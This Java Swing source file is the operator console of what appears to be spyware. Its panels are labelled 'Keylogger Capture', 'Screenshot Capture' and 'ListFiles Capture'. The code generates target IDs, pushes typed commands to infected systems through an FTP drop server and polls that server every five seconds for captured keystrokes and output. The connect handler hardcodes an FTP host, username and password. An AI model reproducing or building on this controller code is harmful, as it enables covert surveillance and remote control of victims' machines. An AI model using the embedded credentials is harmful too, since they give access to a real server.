package inter.inout;
import java.awt.Color;
import java.awt.Cursor;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;
import java.awt.event.MouseEvent;
import java.awt.event.MouseListener;
import java.beans.PropertyVetoException;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.security.NoSuchAlgorithmException;

import javax.swing.BorderFactory;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JEditorPane;
import javax.swing.JFrame;
import javax.swing.JInternalFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTextField;
import javax.swing.border.EtchedBorder;

import ftp.conn.FtpConnection;
import ufs.generator.CryptDate;
import ufs.generator.UFgenerator;

public class Inout01 extends JFrame{
	
	/**
	 * 
	 */
	private static final long serialVersionUID = 1L;
	private UFgenerator ufsGen;
	private FtpConnection ftp;
	private static CryptDate crypt;
	private String atualDate;
	private String crypted;
	private String memory = "";
	private boolean timeConn = false;
	
	public static void main(String[] args) throws IOException, NoSuchAlgorithmException, PropertyVetoException {
			Inout01 inout = new Inout01();
			inout.setVisible(true);
		
		
			
	}
	
	
	public Inout01() throws IOException, PropertyVetoException{
		String getPath = new File("").getAbsolutePath();
		ftp = new FtpConnection();
		crypt = new CryptDate();
		ufsGen = new UFgenerator();
		
		this.setTitle("Inout01 - Extreme Comunication");
		this.setBounds(250, 0, 900, 700);
		
		JPanel panel = new JPanel();
		this.add(panel);
		
		JLabel label = new JLabel();
		label.setText("<html><div width='900' height='700' style='background-color:black;'></div></html>");
		panel.add(label);
		

		ImageIcon play = new ImageIcon(getClass().getResource("/images/play.jpg"));
		ImageIcon stop = new ImageIcon(getClass().getResource("/images/stop.jpg"));
		ImageIcon down = new ImageIcon(getClass().getResource("/images/down.jpg"));
		ImageIcon up = new ImageIcon(getClass().getResource("/images/up.jpg"));
		ImageIcon code = new ImageIcon(getClass().getResource("/images/code.jpg"));
		ImageIcon imgEF = new ImageIcon(getClass().getResource("/images/ef.jpg"));
		ImageIcon imgInfo = new ImageIcon(getClass().getResource("/images/info.jpg"));
		ImageIcon screen = new ImageIcon(getClass().getResource("/images/screen.jpg"));
		ImageIcon flist = new ImageIcon(getClass().getResource("/images/flist.jpg"));
		
		JInternalFrame frameImg = new JInternalFrame();
		frameImg.setTitle("System: EF - Screenshot Capture");
		frameImg.setBounds(330, 405, 350, 240);
		frameImg.setClosable(true);
		frameImg.setResizable(true);
		frameImg.setIconifiable(true);
		//frameImg.setMaximizable(true);
		frameImg.setFrameIcon(screen);
		label.add(frameImg);
		
		JPanel panelImgCap = new JPanel();
		frameImg.add(panelImgCap);
		
		JLabel labelImgCap = new JLabel();
		labelImgCap.setBounds(0, 0, 350, 240);
		labelImgCap.setText("<html><div width='350' height='240' style='background-color:black;'></div></html>");
		panelImgCap.add(labelImgCap);
		
		JInternalFrame frameList = new JInternalFrame();
		frameList.setTitle("System: EF - ListFiles Capture");
		frameList.setBounds(685, 100, 200, 550);
		frameList.setBackground(Color.black);
		frameList.setClosable(true);
		frameList.setResizable(true);
		frameList.setMaximizable(true);
		frameList.setFrameIcon(flist);
		label.add(frameList);
		
		
		JPanel panelList = new JPanel();
		frameList.add(panelList);
		
		JLabel labelList = new JLabel();
		labelList.setBounds(0, 0, 200, 550);
		labelList.setText("<html><div width='200' height='550'></div></html>");
		panelList.add(labelList);
		
		
		
		JInternalFrame frameInfo = new JInternalFrame();
		frameInfo.setTitle("Informations Painel");
		frameInfo.setBounds(200, 100, 300, 350);
		frameInfo.setClosable(true);
		frameInfo.setBackground(Color.black);
		frameInfo.setResizable(false);
		frameInfo.setFrameIcon(imgInfo);
		label.add(frameInfo);
		
		JPanel panelInfo = new JPanel();
		frameInfo.add(panelInfo);
		
		JLabel labelInfo = new JLabel();
		labelInfo.setBounds(0, 0, 300, 350);
		labelInfo.setText("<html><div width='300' height='350' style='background-color:black;'></div></html>");
		panelInfo.add(labelInfo);
		
		JEditorPane infoPane = new JEditorPane();
		infoPane.setContentType("text/html");
		infoPane.setBackground(Color.black);
		infoPane.setForeground(Color.red);
		infoPane.setBounds(0, 0, 300, 300);
		infoPane.setEditable(false);
		labelInfo.add(infoPane);
		
		JScrollPane scrollPane = new JScrollPane(infoPane);
		scrollPane.setVerticalScrollBarPolicy(JScrollPane.VERTICAL_SCROLLBAR_ALWAYS);
		scrollPane.setHorizontalScrollBarPolicy(JScrollPane.HORIZONTAL_SCROLLBAR_ALWAYS);
		scrollPane.setBorder(BorderFactory.createEtchedBorder(EtchedBorder.LOWERED));
		scrollPane.setBounds(0, 0, 300, 300);
		labelInfo.add(scrollPane);
		
		JInternalFrame frameCapture = new JInternalFrame();
		frameCapture.setTitle("System: EF - Keylogger Capture");
		frameCapture.setBounds(330, 100, 350, 300);
		frameCapture.setClosable(true);
		frameCapture.setResizable(false);
		frameCapture.setBackground(Color.black);
		frameCapture.setMaximizable(true);
		frameCapture.setFrameIcon(imgInfo);
		label.add(frameCapture);
		

		JPanel panel1 = new JPanel();
		frameCapture.add(panel1);
		
		JLabel label1 = new JLabel();
		label1.setText("<html><div width='550' height='500' style='background-color:black;'></div></html>");
		panel1.add(label1);
		
		JEditorPane paneInfo = new JEditorPane();
		paneInfo.setContentType("text/html");
		paneInfo.setBackground(Color.white);
		paneInfo.setForeground(Color.black);
		paneInfo.setBounds(110, 0, 330, 250);
		paneInfo.setEditable(false);
		label1.add(paneInfo);
		
		JScrollPane scrollInfo = new JScrollPane(paneInfo);
		scrollInfo.setVerticalScrollBarPolicy(JScrollPane.VERTICAL_SCROLLBAR_ALWAYS);
		scrollInfo.setHorizontalScrollBarPolicy(JScrollPane.HORIZONTAL_SCROLLBAR_ALWAYS);
		scrollInfo.setBorder(BorderFactory.createEtchedBorder(EtchedBorder.LOWERED));
		scrollInfo.setBounds(110, 0, 330, 250);
		label1.add(scrollInfo);
		
		JInternalFrame frameCode = new JInternalFrame();
		frameCode.setTitle("Programming Editor");
		frameCode.setBounds(20, 400, 300, 250);
		frameCode.setBackground(Color.black);
		frameCode.setClosable(true);
		frameCode.setResizable(false);
		frameCode.setFrameIcon(code);
		label.add(frameCode);
		
		JPanel panelCode = new JPanel();
		frameCode.add(panelCode);
		
		JLabel labelCode = new JLabel();
		labelCode.setBounds(0, 0, 300, 250);
		labelCode.setText("<html><div width='300' height='250' style='background-color:black;'></div></html>");
		panelCode.add(labelCode);
		
		JEditorPane codePane = new JEditorPane();
		codePane.setBackground(Color.black);
		codePane.setBounds(0, 0, 300, 200);
		codePane.setForeground(Color.white);
		codePane.setEditable(true);
		labelCode.add(codePane);
		
		JScrollPane scrollCode = new JScrollPane(codePane);
		scrollCode.setVerticalScrollBarPolicy(JScrollPane.VERTICAL_SCROLLBAR_ALWAYS);
		scrollCode.setHorizontalScrollBarPolicy(JScrollPane.HORIZONTAL_SCROLLBAR_ALWAYS);
		scrollCode.setBorder(BorderFactory.createEtchedBorder(EtchedBorder.LOWERED));
		scrollCode.setBounds(0, 0, 300, 200);
		labelCode.add(scrollCode);
		

		JInternalFrame frameConnect = new JInternalFrame();
		frameConnect.setTitle("Connect in system");
		frameConnect.setBounds(20, 100, 300, 120);
		frameConnect.setBackground(Color.black);
		frameConnect.setClosable(true);
		frameConnect.setResizable(false);
		frameConnect.setFrameIcon(play);
		label.add(frameConnect);
		
		JPanel panelConnect = new JPanel();
		frameConnect.add(panelConnect);
		
		JLabel labelConnect = new JLabel();
		labelConnect.setBounds(0, 0, 300, 120);
		labelConnect.setText("<html><div width='300' height='120' style='background-color:black;'></div></html>");
		labelConnect.setBackground(Color.black);
		panelConnect.add(labelConnect);
		
		JInternalFrame frameEf = new JInternalFrame();
		frameEf.setTitle("Generate EF");
		frameEf.setBounds(20, 225, 300, 170);
		frameEf.setClosable(true);
		frameEf.setResizable(false);
		frameEf.setFrameIcon(imgEF);
		label.add(frameEf);
		
		JPanel panelEf = new JPanel();
		frameEf.add(panelEf);
		
		JLabel labelEf = new JLabel();
		labelEf.setBounds(0, 0, 300, 170);
		labelEf.setText("<html><div width='300' height='170' style='background-color:black;'></div></html>");
		panelEf.add(labelEf);
		
		JLabel nameFileEf = new JLabel();
		nameFileEf.setText("<html><b>Arquivo:</b></html>");
		nameFileEf.setBounds(10, 10, 50, 20);
		labelEf.add(nameFileEf);
		
		JTextField textFieldEf = new JTextField();
		textFieldEf.setBounds(10, 30, 250, 20);
		textFieldEf.setBackground(Color.black);
		labelEf.add(textFieldEf);
		
		JLabel namePath = new JLabel();
		namePath.setText("<html><b>Destino:</b></html>");
		namePath.setBounds(10, 50, 50, 20);
		labelEf.add(namePath);
		
		JTextField textFieldPath = new JTextField();
		textFieldPath.setBounds(10, 70, 250, 20);
		textFieldPath.setBackground(Color.black);
		labelEf.add(textFieldPath);
		
		JButton generateEf = new JButton();
		generateEf.setText("generate");
		generateEf.setBounds(150, 100, 90, 20);
		generateEf.setBackground(Color.black);
		labelEf.add(generateEf);
		
		
		JButton connect = new JButton();
		connect.setText("conectar");
		connect.setForeground(Color.blue);
		connect.setVisible(true);
		connect.setBounds(150, 50, 120, 20);
		connect.setBackground(Color.black);
		labelConnect.add(connect);
		
		JLabel labelChoose = new JLabel();
		labelChoose.setBounds(20, 1, 150, 20);
		labelChoose.setVisible(true);
		labelChoose.setText("Escolha um sistema:");
		labelConnect.add(labelChoose);
		
		JComboBox<String> combo = new JComboBox<String>();
		combo.setBounds(20, 20, 250, 20);
		combo.setVisible(true);
		combo.setToolTipText("combobox");
		labelConnect.add(combo);
		
		JButton connection = new JButton();
		connection.setBounds(10, 0, 100, 20);
		connection.setBackground(Color.black);
		connection.setForeground(Color.green);
		connection.setText("Connection");
		label.add(connection);
		
		JLabel noSystem = new JLabel();
		noSystem.setBounds(50, 20, 200, 20);
		noSystem.setVisible(false);
		labelConnect.add(noSystem);
		
		
		JPanel panel2 = new JPanel();
		panel2.setBounds(15, 25, 860, 70);
		panel2.setBackground(Color.white);
		panel2.setVisible(false);
		label.add(panel2);
		
		JLabel label2 = new JLabel();
		label2.setText("<html><div width='856' height='63' style='background-color:black;'></div></html>");
		label2.setBounds(0, 0, 856, 63);
		panel2.add(label2);
	
		
		JLabel labelPlay = new JLabel();
		labelPlay.setBounds(20, 10, 20, 30);
		labelPlay.setIcon(play);
		labelPlay.setToolTipText("connect");
		labelPlay.setVisible(false);
		labelPlay.setCursor(new Cursor(Cursor.HAND_CURSOR));
		label2.add(labelPlay);
		
		JLabel labelStop = new JLabel();
		labelStop.setBounds(20, 10, 20, 30);
		labelStop.setIcon(stop);
		labelStop.setToolTipText("desconnect");
		labelStop.setVisible(false);
		labelStop.setCursor(new Cursor(Cursor.HAND_CURSOR));
		label2.add(labelStop);
		
		JLabel labeldown = new JLabel();
		labeldown.setBounds(60, 10, 20, 30);
		labeldown.setIcon(down);
		labeldown.setToolTipText("receive");
		labeldown.setVisible(false);
		labeldown.setCursor(new Cursor(Cursor.HAND_CURSOR));
		label2.add(labeldown);
		
		JLabel labelup = new JLabel();
		labelup.setBounds(100, 10, 20, 30);
		labelup.setIcon(up);
		labelup.setToolTipText("send");
		labelup.setVisible(false);
		labelup.setCursor(new Cursor(Cursor.HAND_CURSOR));
		label2.add(labelup);
		
		JLabel lcode = new JLabel();
		lcode.setBounds(20, 10, 20, 30);
		lcode.setIcon(code);
		lcode.setToolTipText("programming");
		lcode.setVisible(false);
		lcode.setCursor(new Cursor(Cursor.HAND_CURSOR));
		label2.add(lcode);
		

		JLabel hashGen = new JLabel();
		hashGen.setBounds(60, 10, 20, 30);
		hashGen.setIcon(imgEF);
		hashGen.setToolTipText("Generate EF");
		hashGen.setVisible(false);
		hashGen.setCursor(new Cursor(Cursor.HAND_CURSOR));
		label2.add(hashGen);
		
	
		
		JLabel showInfo = new JLabel();
		showInfo.setBounds(20, 10, 30, 30);
		showInfo.setIcon(imgInfo);
		showInfo.setToolTipText("Informations");
		showInfo.setVisible(false);
		showInfo.setCursor(new Cursor(Cursor.HAND_CURSOR));
		label2.add(showInfo);
		
		JLabel labelscreen = new JLabel();
		labelscreen.setBounds(60, 10, 30, 30);
		labelscreen.setIcon(screen);
		labelscreen.setToolTipText("ScreenShot");
		labelscreen.setVisible(false);
		labelscreen.setCursor(new Cursor(Cursor.HAND_CURSOR));
		label2.add(labelscreen);
		
		JLabel labelflist = new JLabel();
		labelflist.setBounds(100, 10, 30, 30);
		labelflist.setIcon(flist);
		labelflist.setToolTipText("List Files");
		labelflist.setVisible(false);
		labelflist.setCursor(new Cursor(Cursor.HAND_CURSOR));
		label2.add(labelflist);
		
		labelscreen.addMouseListener(new MouseListener() {
			
			@Override
			public void mouseReleased(MouseEvent e) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mousePressed(MouseEvent e) {
				frameImg.show();
				
			}
			
			@Override
			public void mouseExited(MouseEvent e) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mouseEntered(MouseEvent e) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mouseClicked(MouseEvent e) {
				// TODO Auto-generated method stub
				
			}
		});
		
		labelflist.addMouseListener(new MouseListener() {
			
			@Override
			public void mouseReleased(MouseEvent e) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mousePressed(MouseEvent e) {
				frameList.show();
				
			}
			
			@Override
			public void mouseExited(MouseEvent e) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mouseEntered(MouseEvent e) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mouseClicked(MouseEvent e) {
				// TODO Auto-generated method stub
				
			}
		});
		
		
		codePane.addKeyListener(new KeyListener() {
			
			@Override
			public void keyTyped(KeyEvent event) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void keyReleased(KeyEvent event) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void keyPressed(KeyEvent event) {
				
				if(event.getKeyCode() == KeyEvent.VK_F11){
					new Thread(new Runnable(){
						@Override
						public void run(){
							try {
								frameInfo.show();
								infoPane.setText("<font color='red'>Enviando para o sistema "+FtpConnection.systemCrypt+"...</font>");
								String getSelect = combo.getSelectedItem().toString();
								ufsGen.generateUfr(getSelect, codePane.getText(), getPath+"//");
								Thread.sleep(2000);
								ftp.upload(getSelect+".in", getSelect+".in", getPath+"//");
								infoPane.setText("<font color='green'>Código enviado com sucesso!...</font>");
								try {
									Thread.sleep(2000);
								} catch (InterruptedException e1) {}
								
								frameInfo.dispose();
							} catch (IOException e1) { 
								infoPane.setText("<font color='red'>Falha ao enviar o código!...</font>");
							} catch (InterruptedException e1) {}
						}
					}).start();
				}
				
				if(codePane.getText().contains("shutdown")){
					codePane.setForeground(Color.red);
				}else
					if(codePane.getText().contains("write")){
						codePane.setForeground(Color.green);
					}
				
				
				
			}
		});
		
	
		generateEf.addMouseListener(new MouseListener() {
			
			@Override
			public void mouseReleased(MouseEvent e) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mousePressed(MouseEvent e) {
				connect.setVisible(true);
				combo.setVisible(true);
				labelChoose.setVisible(true);
				
				atualDate = crypt.getDateTime();
				crypted = CryptDate.hexaString(CryptDate.hashGenerate(atualDate, "SHA-1"));
				
				File direct = new File(getPath+"//");
				File arrayDir[] = direct.listFiles();
				int is = 0;
				String memoria = "";
				String memoria1 = "";
				for(int js = arrayDir.length; is < js; is++){
					File arquivoss = arrayDir[is];
					String arss = arquivoss.getName();
					
						memoria += arss;
					
				}
				
				if(memoria.contains("arquivoHash.hash")){
					combo.removeItem("-------------");
					combo.addItem("-------------");
					FileReader fileReader;
					try {
						fileReader = new FileReader(getPath+"//"+"arquivoHash.hash");
						BufferedReader buffReader = new BufferedReader(fileReader);
						String buff = buffReader.readLine();

						
						while(buff != null){
							memoria1 += buff + "\r\n";
							buff = buffReader.readLine();
							combo.removeItem(buff);
						}
						
						buffReader.close();
					} catch (FileNotFoundException e2) {} 
					catch (IOException e1) {}
					
					
					try {
						ufsGen.generateHash("arquivoHash", memoria1+crypted, getPath+"//");
						combo.addItem(memoria1+crypted);
					} catch (IOException e1) {}
					
					
					
					
					
				}else{
					combo.removeItem("-------------");
					combo.addItem("-------------");
					try {
						ufsGen.generateHash("arquivoHash", crypted, getPath+"//");
					} catch (IOException e1) {}
					String getHash;
					try {
						getHash = ufsGen.getHash("arquivoHash", getPath+"//");
						combo.addItem(getHash);
						
					} catch (FileNotFoundException e1) {} 
					catch (IOException e1) {}
					
				}
				
			}
			
			@Override
			public void mouseExited(MouseEvent e) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mouseEntered(MouseEvent e) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mouseClicked(MouseEvent e) {
				// TODO Auto-generated method stub
				
			}
		});
		
		lcode.addMouseListener(new MouseListener() {
			
			@Override
			public void mouseReleased(MouseEvent e) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mousePressed(MouseEvent e) {
				frameCode.show();
				
			}
			
			@Override
			public void mouseExited(MouseEvent e) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mouseEntered(MouseEvent e) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mouseClicked(MouseEvent e) {
				// TODO Auto-generated method stub
				
			}
		});
		
		labelPlay.addMouseListener(new MouseListener() {
			
			@Override
			public void mouseReleased(MouseEvent e) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mousePressed(MouseEvent e) {
				File directories = new File(getPath+"//");
				File direcArray[] = directories.listFiles();
				int f = 0;
				String armaz = "";
				for(int size = direcArray.length; f < size; f++){
					File position = direcArray[f];
					String getName = position.getName();
					
					armaz += getName;
					
					
				}
				
				if(armaz.contains("arquivoHash.hash")){
					combo.removeItem("-------------");
					combo.addItem("-------------");
					FileReader fileReader;
					try {
						fileReader = new FileReader(getPath+"//"+"arquivoHash.hash");
						BufferedReader buffReader = new BufferedReader(fileReader);
						String buff = buffReader.readLine();
						while(buff != null){
							combo.removeItem(buff);
							combo.addItem(buff);
							buff = buffReader.readLine();
						}
						buffReader.close();
					} catch (FileNotFoundException e1) {
						// TODO Auto-generated catch block
						e1.printStackTrace();
					} catch (IOException e1) {
						// TODO Auto-generated catch block
						e1.printStackTrace();
					}
					
					
					
				}else{
					connect.setVisible(false);
					labelChoose.setVisible(false);
					combo.setVisible(false);
					noSystem.setVisible(true);
					noSystem.setText("<html><b>Nenhum sistema encontrado!</b></html>");
				}
				
				if(frameConnect.isShowing()){
					System.err.println("O frame já está aberto!");
					
				}else{
					frameConnect.show();
				}
				
			}
			
			@Override
			public void mouseExited(MouseEvent e) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mouseEntered(MouseEvent e) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mouseClicked(MouseEvent e) {
				// TODO Auto-generated method stub
				
			}
		});
		
		labelStop.addMouseListener(new MouseListener() {
			
			@Override
			public void mouseReleased(MouseEvent e) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mousePressed(MouseEvent e) {
				
				new Thread(new Runnable(){
					@Override
					public void run(){

						
						
						frameInfo.show();
						infoPane.setText("<font color='red'>Desconectado do sistema "+FtpConnection.systemCrypt+"</font>");
						
						try {
							Thread.sleep(3000);
						} catch (InterruptedException e1) {}
						
						frameInfo.dispose();
					}
				}).start();
				
				connect.setText("conectar");
				connect.setForeground(Color.blue);
				
				try {
					ftp.disconnect();
				} catch (IOException e1) {}
				
				labelStop.setVisible(false);
				labelPlay.setVisible(true);
			}
			
			@Override
			public void mouseExited(MouseEvent e) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mouseEntered(MouseEvent e) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mouseClicked(MouseEvent e) {
				// TODO Auto-generated method stub
				
			}
		});
		
		labeldown.addMouseListener(new MouseListener() {
			
			@Override
			public void mouseReleased(MouseEvent e) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mousePressed(MouseEvent e) {
				new Thread(new Runnable(){
					@Override
					public void run(){
						while(true){
							try {
								Thread.sleep(5000);
							} catch (InterruptedException e) {}
							
							
							String getUFS = "";
							String getSelect = combo.getSelectedItem().toString();
							try {
								
								ftp.download(getSelect+".out", getSelect+".out", getPath+"//");
								Thread.sleep(500);
								getUFS = ufsGen.getUFS(getSelect, getPath+"//");
							} catch (IOException e1) {} catch (InterruptedException e) {}
							
								memory += getUFS + "<br><br>";
								
								
						}
						
					}
				}).start();
				
				new Thread(new Runnable(){
					@Override
					public void run(){
						frameInfo.show();
						while(true){
							for(int i = 0; i <= 7; i++){
								try {
									Thread.sleep(180);
								} catch (InterruptedException e) {}
								
								
								if(i == 1){infoPane.setText("<font color='red'>receiving.</font>");} 
								if(i == 2){infoPane.setText("<font color='red'>receiving..</font>");}
								if(i == 3){infoPane.setText("<font color='red'>receiving...</font>");}
								if(i == 4){infoPane.setText("<font color='red'>receiving....</font>");}
								if(i == 5){infoPane.setText("<font color='red'>receiving.....</font>");}
								if(i == 6){infoPane.setText("<font color='red'>receiving......</font>");}
								if(i == 7){infoPane.setText("<font color='red'>receiving.......</font>");}	
								
							}
						}
					}
				}).start();
				
			}
			
			@Override
			public void mouseExited(MouseEvent e) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mouseEntered(MouseEvent e) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mouseClicked(MouseEvent e) {
				// TODO Auto-generated method stub
				
			}
		});
		
		labelup.addMouseListener(new MouseListener() {
			
			@Override
			public void mouseReleased(MouseEvent e) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mousePressed(MouseEvent e) {
				new Thread(new Runnable(){
					@Override
					public void run(){
						try {
							frameInfo.show();
							infoPane.setText("<font color='red'>Enviando para o sistema "+FtpConnection.systemCrypt+"...</font>");
							String getSelect = combo.getSelectedItem().toString();
							ufsGen.generateUfr(getSelect, codePane.getText(), getPath+"//");
							Thread.sleep(2000);
							ftp.upload(getSelect+".in", getSelect+".in", getPath+"//");
							infoPane.setText("<font color='green'>Código enviado com sucesso!...</font>");
							try {
								Thread.sleep(2000);
							} catch (InterruptedException e1) {}
							
							frameInfo.dispose();
						} catch (IOException e1) {} catch (InterruptedException e1) {}
					}
				}).start();
		
				
			}
			
			@Override
			public void mouseExited(MouseEvent e) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mouseEntered(MouseEvent e) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mouseClicked(MouseEvent e) {
				// TODO Auto-generated method stub
				
			}
		});
		
		connection.addMouseListener(new MouseListener() {
			
			@Override
			public void mouseReleased(MouseEvent e) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mousePressed(MouseEvent e) {
				
				panel2.setVisible(true);
				labelPlay.setVisible(true);
				labeldown.setVisible(true);
				labelup.setVisible(true);
				lcode.setVisible(false);
				showInfo.setVisible(false);
				hashGen.setVisible(false);
				labelflist.setVisible(false);
				labelscreen.setVisible(false);
				
			}
			
			@Override
			public void mouseExited(MouseEvent e) {
				connection.setForeground(Color.green);
				
			}
			
			@Override
			public void mouseEntered(MouseEvent e) {
				connection.setForeground(Color.red);
				
			}
			
			@Override
			public void mouseClicked(MouseEvent e) {
				connection.setForeground(Color.white);
				
			}
		});
		
		JButton generator = new JButton();
		generator.setBounds(110, 0, 110, 20);
		generator.setText("Generator");
		generator.setBackground(Color.black);
		generator.setBackground(Color.black);
		generator.setForeground(Color.green);
		label.add(generator);
		
		generator.addMouseListener(new MouseListener() {
			
			@Override
			public void mouseReleased(MouseEvent e) {
				
				
			}
			
			@Override
			public void mousePressed(MouseEvent e) {
				panel2.setVisible(true);
				labelPlay.setVisible(false);
				labeldown.setVisible(false);
				labelup.setVisible(false);
				labelStop.setVisible(false);
				showInfo.setVisible(false);
				labelflist.setVisible(false);
				labelscreen.setVisible(false);
				hashGen.setVisible(true);
				lcode.setVisible(true);
				
				
			}
			
			@Override
			public void mouseExited(MouseEvent e) {
				generator.setForeground(Color.green);
				
			}
			
			@Override
			public void mouseEntered(MouseEvent e) {
				generator.setForeground(Color.red);
				
			}
			
			@Override
			public void mouseClicked(MouseEvent e) {
				generator.setForeground(Color.white);
				
			}
		});
		
		JButton capturate = new JButton();
		capturate.setBounds(220, 0, 110, 20);
		capturate.setText("Capturate");
		capturate.setBackground(Color.black);
		capturate.setForeground(Color.green);
		label.add(capturate);
		
		capturate.addMouseListener(new MouseListener() {
			
			@Override
			public void mouseReleased(MouseEvent e) {
		
				
			}
			
			@Override
			public void mousePressed(MouseEvent e) {
				panel2.setVisible(true);
				labelPlay.setVisible(false);
				labeldown.setVisible(false);
				labelup.setVisible(false);
				labelStop.setVisible(false);
				lcode.setVisible(false);
				hashGen.setVisible(false);
				showInfo.setVisible(true);
				labelflist.setVisible(true);
				labelscreen.setVisible(true);
				
			}
			
			@Override
			public void mouseExited(MouseEvent e) {
				capturate.setForeground(Color.green);
				
			}
			
			@Override
			public void mouseEntered(MouseEvent e) {
				capturate.setForeground(Color.red);
				
			}
			
			@Override
			public void mouseClicked(MouseEvent e) {
				capturate.setForeground(Color.white);
				
			}
		});
		
		
		
		
		
		connect.addActionListener(new ActionListener() {
			
			@Override
			public void actionPerformed(ActionEvent e) {
				
				if(combo.getSelectedItem().toString().equals("-------------")){
					JOptionPane.showMessageDialog(labelConnect, "<html><font color='red'>Por favor! escolha um sistema!</font></html>");
				}else{
				try {
					if(connect.getText().equals("conectar")){
						timeConn = false;
						FtpConnection.systemCrypt = combo.getSelectedItem().toString();
						
						new Thread(new Runnable(){
							@Override
							public void run(){
								while(timeConn == false){
									if(FtpConnection.Connections == 0){
										frameInfo.show();
										infoPane.setText("<font color='red'>Falha ao se conectar com "+FtpConnection.systemCrypt+"!</font>");
										try {
											Thread.sleep(1000);
										} catch (InterruptedException e) {}
										
										frameInfo.dispose();
									}else
										if(FtpConnection.Connections == 1){
											infoPane.setText("<font color='green'>Conectado ao sistema "+FtpConnection.systemCrypt+"</font>");
											connect.setText("desconectar");
											connect.setForeground(Color.red);
											labelPlay.setVisible(false);
											labelStop.setVisible(true);
										}
								}
								
								
							}
						}).start();
						
						new Thread(new Runnable(){
							@Override
							public void run(){
								frameInfo.show();
								char point = '.';
								String armPoint = "";
								while(timeConn == false){
									infoPane.setText("<font color='red'>conectando-se ao sistema"+armPoint+"</font>");
								
									armPoint += point;
									try {
										Thread.sleep(500);
									} catch (InterruptedException e) {}
								}
								
								try {
									Thread.sleep(2000);
								} catch (InterruptedException e) {}
								
								frameInfo.dispose();
								
							}
						}).start();
						
						new Thread(new Runnable(){
							@Override
							public void run(){
								try {
									FtpConnection.serverLogin("f15-preview.eohost.com", "2163708", "1324354657687980sitedoprojeto");
								} catch (IOException e1) {
									// TODO Auto-generated catch block
									e1.printStackTrace();
								}
								timeConn = true;
							}
						}).start();
								
					
						
						
						
					}else
						if(connect.getText().equals("desconectar")){
							new Thread(new Runnable(){
								@Override
								public void run(){

									
									
									frameInfo.show();
									infoPane.setText("<font color='red'>Desconectado do sistema "+FtpConnection.systemCrypt+"</font>");
									
									try {
										Thread.sleep(3000);
									} catch (InterruptedException e1) {}
									
									frameInfo.dispose();
								}
							}).start();
							
							ftp.disconnect();
						
							
							connect.setText("conectar");
							connect.setForeground(Color.blue);
							labelPlay.setVisible(true);
							labelStop.setVisible(false);
							
						}
					
					
				} 	catch (IOException e1) {
						
						infoPane.setText("<font color='red'>Falha na conexão à "+FtpConnection.systemCrypt+"!</font>");
						timeConn = true;
					}
				}
			}
		});
		
		hashGen.addMouseListener(new MouseListener() {
			
			@Override
			public void mouseReleased(MouseEvent e) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mousePressed(MouseEvent e) {
				frameEf.show();
				
			}
			
			@Override
			public void mouseExited(MouseEvent e) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mouseEntered(MouseEvent e) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mouseClicked(MouseEvent e) {
				// TODO Auto-generated method stub
				
			}
		});
		
		showInfo.addMouseListener(new MouseListener() {
			
			@Override
			public void mouseReleased(MouseEvent e) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mousePressed(MouseEvent e) {
				frameCapture.show();
				
				
				paneInfo.setText(memory);
				
			}
			
			@Override
			public void mouseExited(MouseEvent e) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mouseEntered(MouseEvent e) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void mouseClicked(MouseEvent e) {
				// TODO Auto-generated method stub
				
			}
		});
		
		
	}
}
